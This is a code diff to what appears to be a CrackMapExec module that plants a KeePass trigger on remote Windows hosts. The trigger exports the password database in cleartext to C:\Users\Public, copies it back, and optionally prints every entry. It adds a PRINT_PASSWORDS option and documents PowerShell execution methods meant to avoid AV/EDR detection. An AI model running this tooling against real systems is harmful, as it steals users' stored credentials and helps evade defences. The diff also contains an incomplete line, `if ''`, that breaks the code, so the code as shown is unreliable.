@@ -1,3 +1,4 @@
+import os
 import sys
 import json
 from xmltodict import parse
@@ -34,6 +35,7 @@ class CMEModule:
         self.export_name = 'export.xml'
         self.export_path = 'C:\\Users\\Public'
         self.powershell_exec_method = 'PS1'
+        self.print_passwords = 'FALSE'
 
         # additionnal parameters
         self.share = 'C$'
@@ -69,6 +71,7 @@ class CMEModule:
         EXPORT_NAME             Name fo the database export file, default: export.xml
         EXPORT_PATH             Path where to export the KeePass database in cleartext, default: C:\\Users\\Public, %APPDATA% works well too for user permissions
 
+        PRINT_PASSWORDS         Print every database entry when successfully recovered a cleartext database (TRUE/FALSE, default: FALSE)
         PSH_EXEC_METHOD         Powershell execution method, may avoid detections depending on the AV/EDR in use (while no 'malicious' command is executed..):
                                   ENCODE        run scripts through encoded oneliners
                                   PS1           run scripts through a file dropped in C:\\Windows\\Temp (default)
@@ -98,6 +101,9 @@ class CMEModule:
         if 'EXPORT_PATH' in module_options:
             self.export_path = module_options['EXPORT_PATH']
 
+        if 'PRINT_PASSWORDS' in module_options:
+            self.print_passwords = module_options['PRINT_PASSWORDS']
+
         if 'PSH_EXEC_METHOD' in module_options:
             if module_options['PSH_EXEC_METHOD'] not in ['ENCODE', 'PS1']:
                 context.log.error('Unrecognized powershell execution method, use --options to list available parameters')
@@ -105,6 +111,7 @@ class CMEModule:
             else:
                 self.powershell_exec_method = module_options['PSH_EXEC_METHOD']
 
+        if ''
     def on_admin_login(self, context, connection):
 
         if self.action == 'ADD':
@@ -264,6 +271,11 @@ class CMEModule:
                     connection.execute(remove_export_command_str, True)
                     context.log.success('Moved remote "{}" to local "{}"'.format(export_path, local_full_path))
                     found = True
+
+                    if self.print_passwords == 'TRUE':
+                        context.log.info('Extracting passwords..')
+                        self.extract_password(context)
+
                 except Exception as e:
                     context.log.error("Error while polling export files, exiting : {}".format(e))
 
@@ -326,9 +338,6 @@ class CMEModule:
         context.log.info('Cleaning everything..')
         self.clean(context, connection)
         self.restart(context, connection)
-        context.log.highlight("")
-        context.log.info('Extracting password..')
-        self.extract_password(context)
 
     def trigger_added(self, context, connection):
         """check if the trigger is added to the config file XML tree (returns True/False)"""
